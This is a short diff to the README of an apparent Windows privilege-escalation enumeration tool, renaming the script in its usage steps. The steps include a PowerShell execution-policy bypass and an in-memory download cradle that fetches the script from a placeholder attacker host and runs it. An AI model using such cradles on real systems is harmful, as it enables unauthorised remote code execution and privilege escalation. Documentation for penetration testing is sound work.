@@ -25,12 +25,12 @@ ___
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 # Run the script
-.\WinPrivEsc-Triage.ps1
+.\WinPrivEsc.ps1
 ```
 ### Method 2: In-Memory (Download Cradle)
 - If you cannot drop files to disk, you can load it directly into memory (hosted on your own attacking machine or GitHub raw).
 ```
-IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/WinPrivEsc-Triage.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/WinPrivEsc.ps1')
 ```
 ___
 _**will add some more features, toodles for now**_
